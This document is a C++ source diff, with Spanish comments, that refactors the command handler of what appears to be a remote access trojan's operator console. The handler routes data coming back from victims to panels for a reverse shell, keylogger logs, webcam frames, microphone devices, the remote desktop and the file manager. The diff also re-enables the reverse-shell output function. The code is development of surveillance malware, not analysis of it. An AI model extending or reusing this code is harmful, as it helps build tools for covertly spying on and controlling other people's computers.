@@ -6,6 +6,8 @@
 #include "frame_main.hpp"
 #include "panel_file_manager.hpp"
 #include "panel_process_manager.hpp"
+#include "panel_microfono.hpp"
+#include "panel_reverse_shell.hpp"
 #include "panel_keylogger.hpp"
 #include "panel_camara.hpp"
 #include "file_editor.hpp"
@@ -200,7 +202,8 @@ void Cliente_Handler::Process_Command(const Paquete_Queue& paquete) {
     //Termino la shell
     if (iComando == EnumComandos::Reverse_Shell_Finish) {
         if (this->m_isFrameVisible()) {
-            this->EscribirSalidShell(std::string("Sapeeeeeeeeeeee"));
+            const char* cBuff = "Sapeeeee";
+            this->EscribirSalidaShell(cBuff);
         }
         return;
     }
@@ -208,7 +211,8 @@ void Cliente_Handler::Process_Command(const Paquete_Queue& paquete) {
     //Salida de shell
     if (iComando == EnumComandos::Reverse_Shell_Salida) {
         if (this->m_isFrameVisible()) {
-            this->EscribirSalidShell(std::string(paquete.cBuffer.data()));
+            const char* cBuff = paquete.cBuffer.data();
+            this->EscribirSalidaShell(cBuff);
         }
         return;
     }
@@ -302,8 +306,7 @@ void Cliente_Handler::Process_Command(const Paquete_Queue& paquete) {
 
                 wxEditForm* temp_edit_form = (wxEditForm*)wxWindow::FindWindowByName(vcDatos[0], this->n_Frame);
                 if (temp_edit_form) {
-                    temp_edit_form->p_txtEditor->AppendText(wxString(cBytes));
-                    temp_edit_form->p_txtEditor->SetInsertionPoint(0);
+                    temp_edit_form->AgregarTexto(cBytes);
                 }
                 else {
                     this->Log("No se pudo encontrar la ventana con id " + vcDatos[0]);
@@ -337,14 +340,8 @@ void Cliente_Handler::Process_Command(const Paquete_Queue& paquete) {
         if (this->m_isFrameVisible()) {
             panelFileManager* temp_panel = (panelFileManager*)wxWindow::FindWindowById(EnumIDS::ID_Panel_FM, this->n_Frame);
             if (temp_panel) {
-                temp_panel->p_RutaActual->SetLabelText(wxString(paquete.cBuffer.data()));
-                temp_panel->c_RutaActual.clear();
-                std::vector<std::string> vcSubRutas = strSplit(paquete.cBuffer.data(), CMD_DEL, 100);
-                for (auto item : vcSubRutas) {
-                    std::string strTemp = item;
-                    strTemp += "\\";
-                    temp_panel->c_RutaActual.push_back(strTemp);
-                }
+                const char* cBuff = paquete.cBuffer.data();
+                temp_panel->ActualizarRuta(cBuff);
             }else {
                 this->Log("No se pudo encontrar panel FM activo");
             }
@@ -364,11 +361,12 @@ void Cliente_Handler::Process_Command(const Paquete_Queue& paquete) {
     }
 
     //Log del keylogger
-    if (iComando == EnumComandos::KL_Salida  ) {
+    if (iComando == EnumComandos::KL_Salida) {
         if (this->m_isFrameVisible()) {
             panelKeylogger* temp_panel = (panelKeylogger*)wxWindow::FindWindowById(EnumIDS::ID_KL_Panel, this->n_Frame);
             if (temp_panel) {
-                temp_panel->txt_Data->AppendText(paquete.cBuffer.data());
+                const char* cBuff = paquete.cBuffer.data();
+                temp_panel->AgregarData(cBuff);
             }else {
                 this->Log("[X] No se pudo encontrar el panel keylogger");
             }
@@ -379,18 +377,11 @@ void Cliente_Handler::Process_Command(const Paquete_Queue& paquete) {
     //mod camara - Lista de dispositivos
     if (iComando == EnumComandos::CM_Lista_Salida) {
         if (this->m_isFrameVisible()) {
-            std::vector<std::string> vcCams = strSplit(paquete.cBuffer.data(), '|', 10); //quien tiene mas de 10 camaras?
-            if (vcCams.size() > 0) {
-                wxComboBox* panel_cam_combo = (wxComboBox*)wxWindow::FindWindowById(EnumCamMenu::ID_Combo_Devices, this->n_Frame);
-                if (panel_cam_combo) {
-                    wxArrayString arrCams;
-                    for (std::string cCam : vcCams) {
-                        arrCams.push_back(cCam);
-                    }
-                    panel_cam_combo->Clear();
-                    panel_cam_combo->Append(arrCams);
-                }
-            }
+            panelCamara* temp_panel_cam = (panelCamara*)wxWindow::FindWindowById(EnumCamMenu::ID_Main_Panel, this->n_Frame);
+            if (temp_panel_cam) {
+                const char* cBuff = paquete.cBuffer.data();
+                temp_panel_cam->ProcesarLista(cBuff);
+            } 
         }
         return;
     }
@@ -406,8 +397,7 @@ void Cliente_Handler::Process_Command(const Paquete_Queue& paquete) {
                 panelPictureBox* panel_picture = (panelPictureBox*)wxWindow::FindWindowByName("CAM" + vcDatos[0], this->n_Frame);
                 if (panel_picture) {
                     panel_picture->OnDrawBuffer(cBytes, iBuffSize);
-                }
-                else {
+                }else {
                     this->Log("[X] No se pudo encontrar el panel de camara");
                 }
             }
@@ -418,24 +408,12 @@ void Cliente_Handler::Process_Command(const Paquete_Queue& paquete) {
     //mod microfono - Lista de dispositivos
     if (iComando == EnumComandos::Mic_Refre_Resultado) {
         if (this->m_isFrameVisible()) {
-            vcDatos = strSplit(std::string(paquete.cBuffer.data()), CMD_DEL, 15); //15 maximo :v
-            if (vcDatos.size() > 0) {
-                wxArrayString cli_devices;
-                for (int i = 0; i<int(vcDatos.size()); i++) {
-                    cli_devices.push_back(vcDatos[i]);
-                }
-
-                panelMicrophone* temp_panel = (panelMicrophone*)wxWindow::FindWindowById(EnumIDS::ID_Panel_Microphone, this->n_Frame);
-                if (temp_panel) {
-                    wxComboBox* temp_combo_box = (wxComboBox*)wxWindow::FindWindowById(EnumIDS::ID_Panel_Mic_CMB_Devices, temp_panel);
-                    if (temp_combo_box) {
-                        temp_combo_box->Clear();
-                        temp_combo_box->Append(cli_devices);
-                    }
-                }else {
-                    DEBUG_MSG("[MIC]No se pudo encontrar ventana activa");
-                    DEBUG_MSG(paquete.cBuffer.data());
-                }
+            panelMicrophone* temp_mic_panel = (panelMicrophone*)wxWindow::FindWindowById(EnumIDS::ID_Panel_Microphone, this->n_Frame);
+            if (temp_mic_panel) {
+                const char* cBuff = paquete.cBuffer.data();
+                temp_mic_panel->ProcesarLista(cBuff);
+            }else {
+                DEBUG_MSG("[MIC]No se pudo encontrar ventana activa");
             }
         }
         return;
@@ -459,34 +437,10 @@ void Cliente_Handler::Process_Command(const Paquete_Queue& paquete) {
     //mod escritorio remoto - lista monitores
     if (iComando == EnumComandos::RD_Lista_Salida) {
         if (this->m_isFrameVisible()) {
-            frameRemoteDesktop* temp_frame = (frameRemoteDesktop*)wxWindow::FindWindowById(EnumRemoteDesktop::ID_Main_Frame, this->n_Frame);
-            if (temp_frame) {
-                std::vector<std::string> vcMonitores = strSplit(std::string(paquete.cBuffer.data()), '|', 20);
-                if (vcMonitores.size() > 0) {
-                    temp_frame->LimpiarVector();
-                    for (std::string strMonitor : vcMonitores) {
-                        //nombre | width | height
-                        std::vector<std::string> vcInfo = strSplit(strMonitor, CMD_DEL, 3);
-                        if (vcInfo.size() == 3) {
-                            MonitorInfo new_monitor;
-                            new_monitor.resWidth = atoi(vcInfo[1].c_str());
-                            new_monitor.resHeight = atoi(vcInfo[2].c_str());
-                            temp_frame->AgregarMonitor(new_monitor);
-                            wxString strEntry = vcInfo[0];
-                            strEntry.append(1, ' ');
-                            strEntry += vcInfo[1];
-                            strEntry.append(1, 'x');
-                            strEntry += vcInfo[2];
-
-                            temp_frame->combo_lista_monitores->Clear();
-                            temp_frame->combo_lista_monitores->Append(strEntry);
-                        }else {
-                            DEBUG_MSG("No se pudo parsear la info del monitor " + strMonitor);
-                        }
-                    }
-                }else {
-                    DEBUG_MSG("No se pudo parsear la informacion:");DEBUG_MSG(paquete.cBuffer.data());
-                }
+            frameRemoteDesktop* temp_rd_frame = (frameRemoteDesktop*)wxWindow::FindWindowById(EnumRemoteDesktop::ID_Main_Frame, this->n_Frame);
+            if (temp_rd_frame) {
+                const char* cBuff = paquete.cBuffer.data();
+                temp_rd_frame->ProcesarLista(cBuff);
             }
         }
         return;
@@ -495,10 +449,10 @@ void Cliente_Handler::Process_Command(const Paquete_Queue& paquete) {
     //mod escritorio remoto - Buffer de video del escritorio
     if (iComando == EnumComandos::RD_Salida) {
         if (this->m_isFrameVisible()) {
-            frameRemoteDesktop* temp_frame = (frameRemoteDesktop*)wxWindow::FindWindowById(EnumRemoteDesktop::ID_Main_Frame, this->n_Frame);
-            if (temp_frame) {
+            frameRemoteDesktop* temp_rd_frame = (frameRemoteDesktop*)wxWindow::FindWindowById(EnumRemoteDesktop::ID_Main_Frame, this->n_Frame);
+            if (temp_rd_frame) {
                 const char* cBufferImagen = paquete.cBuffer.data();
-                temp_frame->OnDrawBuffer(cBufferImagen, iRecibido-1);
+                temp_rd_frame->OnDrawBuffer(cBufferImagen, iRecibido-1);
             }
         }
         return;
@@ -506,13 +460,11 @@ void Cliente_Handler::Process_Command(const Paquete_Queue& paquete) {
 
 }
 
-void Cliente_Handler::EscribirSalidShell(const std::string strSalida) {
-    /*panelReverseShell* panel_shell = (panelReverseShell*)wxWindow::FindWindowById(EnumIDS::ID_Panel_Reverse_Shell, this->n_Frame);
+void Cliente_Handler::EscribirSalidaShell(const char*& cBuffer) {
+    panelReverseShell* panel_shell = (panelReverseShell*)wxWindow::FindWindowById(EnumIDS::ID_Panel_Reverse_Shell, this->n_Frame);
     if (panel_shell) {
-        panel_shell->txtConsole->AppendText(strSalida);
-        int iLast = panel_shell->txtConsole->GetLastPosition();
-        panel_shell->p_uliUltimo = iLast;
-    }*/
+        panel_shell->EscribirSalida(cBuffer);
+    }
     return;
 }
 
